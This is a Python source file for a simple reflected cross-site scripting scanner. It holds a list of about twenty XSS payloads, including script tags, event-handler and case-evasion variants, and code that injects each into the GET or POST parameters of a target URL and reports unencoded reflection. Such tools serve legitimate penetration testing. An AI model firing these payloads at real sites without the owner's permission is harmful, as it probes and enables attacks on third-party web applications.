#!/usr/bin/env python3
"""
Simple XSS (Cross-Site Scripting) Tester
Test web applications for XSS vulnerabilities
"""

import requests
import argparse
import sys
from urllib.parse import urlparse, parse_qs, urlencode
import html

class XSSTester:
    # Common XSS payloads
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<script>alert(1)</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<iframe src='javascript:alert(1)'>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<details/open/ontoggle=alert('XSS')>",
        "'\"><script>alert('XSS')</script>",
        "javascript:alert('XSS')",
        "<img src='x' onerror='alert(1)'>",
        "<svg><script>alert('XSS')</script></svg>",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<<SCRIPT>alert('XSS');//<</SCRIPT>",
        "<IMG SRC=javascript:alert('XSS')>",
        "<IMG SRC=JaVaScRiPt:alert('XSS')>",
        "<IMG SRC=`javascript:alert('XSS')`>",
        "<BODY ONLOAD=alert('XSS')>",
        "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert('XSS')>"
    ]

    def __init__(self, url, method='GET', data=None, verbose=False):
        self.url = url
        self.method = method.upper()
        self.data = data or {}
        self.verbose = verbose
        self.vulnerable_params = []

    def test_payload(self, param, payload):
        """Test a single XSS payload on a parameter"""
        try:
            if self.method == 'GET':
                # Inject into GET parameter
                parsed = urlparse(self.url)
                params = parse_qs(parsed.query)
                params[param] = [payload]
                query = urlencode(params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"

                response = requests.get(test_url, timeout=10)
            else:
                # Inject into POST data
                test_data = self.data.copy()
                test_data[param] = payload
                response = requests.post(self.url, data=test_data, timeout=10)

            # Check if payload is reflected in response without encoding
            response_text = response.text

            # Check for unencoded payload (direct reflection)
            if payload in response_text:
                return 'reflected', 'Direct reflection (no encoding)'

            # Check for partially encoded payload
            encoded_payload = html.escape(payload)
            if payload != encoded_payload and payload.lower() in response_text.lower():
                return 'possible', 'Partial reflection detected'

            return None, None

        except requests.exceptions.RequestException as e:
            if self.verbose:
                print(f"[-] Request error: {e}")
            return None, None

    def test_parameter(self, param):
        """Test all XSS payloads on a specific parameter"""
        print(f"\n[*] Testing parameter: {param}")
        vulnerabilities = []

        for payload in self.XSS_PAYLOADS:
            if self.verbose:
                print(f"[*] Testing payload: {payload[:50]}")

            vuln_type, details = self.test_payload(param, payload)

            if vuln_type:
                vuln_info = {
                    'param': param,
                    'payload': payload,
                    'type': vuln_type,
                    'details': details
                }
                vulnerabilities.append(vuln_info)

                if vuln_type == 'reflected':
                    print(f"[+] VULNERABLE! Parameter: {param}")
                    print(f"    Payload: {payload}")
                    print(f"    Type: {details}")
                elif vuln_type == 'possible' and self.verbose:
                    print(f"[?] Possible XSS: {param}")
                    print(f"    Payload: {payload}")

        return vulnerabilities

    def scan(self):
        """Scan all parameters for XSS vulnerabilities"""
        print(f"[*] XSS Vulnerability Scanner")
        print(f"[*] Target: {self.url}")
        print(f"[*] Method: {self.method}")
        print("-" * 60)

        all_vulnerabilities = []

        # Get parameters to test
        if self.method == 'GET':
            parsed = urlparse(self.url)
            params = parse_qs(parsed.query)
            param_names = list(params.keys())
        else:
            param_names = list(self.data.keys())

        if not param_names:
            print("[-] No parameters found to test")
            return []

        print(f"[*] Found {len(param_names)} parameter(s) to test")

        for param in param_names:
            vulns = self.test_parameter(param)
            all_vulnerabilities.extend(vulns)

        return all_vulnerabilities

    def print_summary(self, vulnerabilities):
        """Print scan summary"""
        print("\n" + "=" * 60)
        print("SCAN SUMMARY")
        print("=" * 60)

        reflected = [v for v in vulnerabilities if v['type'] == 'reflected']
        possible = [v for v in vulnerabilities if v['type'] == 'possible']

        if reflected:
            print(f"\n[!] Found {len(reflected)} confirmed XSS vulnerability(ies)!")
            unique_params = set(v['param'] for v in reflected)
            print(f"[!] Vulnerable parameters: {', '.join(unique_params)}")

        if possible:
            print(f"\n[?] Found {len(possible)} possible XSS vulnerability(ies)")
            unique_params = set(v['param'] for v in possible)
            print(f"[?] Possibly vulnerable parameters: {', '.join(unique_params)}")

        if not vulnerabilities:
            print("\n[+] No XSS vulnerabilities detected")

def main():
    parser = argparse.ArgumentParser(
        description='Simple XSS Vulnerability Tester',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  Test GET parameters:
    %(prog)s -u "http://example.com/search.php?q=test"

  Test POST parameters:
    %(prog)s -u "http://example.com/comment.php" -m POST -d "name=user&comment=test"

  Verbose mode:
    %(prog)s -u "http://example.com/search.php?q=test" -v
        '''
    )

    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-m', '--method', default='GET', choices=['GET', 'POST'],
                        help='HTTP method (default: GET)')
    parser.add_argument('-d', '--data', help='POST data (format: key1=value1&key2=value2)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')

    args = parser.parse_args()

    # Parse POST data if provided
    post_data = {}
    if args.data:
        for pair in args.data.split('&'):
            if '=' in pair:
                key, value = pair.split('=', 1)
                post_data[key] = value

    # Create tester
    tester = XSSTester(
        url=args.url,
        method=args.method,
        data=post_data,
        verbose=args.verbose
    )

    try:
        vulnerabilities = tester.scan()
        tester.print_summary(vulnerabilities)

    except KeyboardInterrupt:
        print("\n\n[!] Scan interrupted by user")
        sys.exit(1)

if __name__ == "__main__":
    main()
